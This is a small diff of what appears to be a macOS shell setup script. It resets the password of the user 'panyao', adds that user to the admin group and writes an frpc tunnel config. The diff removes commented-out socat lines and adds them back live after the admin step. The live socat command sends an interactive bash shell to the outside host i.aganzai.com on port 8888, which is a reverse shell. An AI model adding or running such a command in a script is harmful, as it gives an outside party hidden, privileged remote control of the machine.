@@ -2,8 +2,6 @@
 
 #brew update
 #brew install jq
-#brew install socat
-#socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
 
 
 # api变量解析
@@ -35,6 +33,9 @@ sudo dscl . -passwd /Users/panyao $jssshpwd
 ## 加入admin用户组
 sudo dscl . -append /Groups/admin GroupMembership panyao
 
+
+brew install socat
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:i.aganzai.com:8888
 
 rm -rf frpc.ini
 cat >> frpc.ini <<EOF
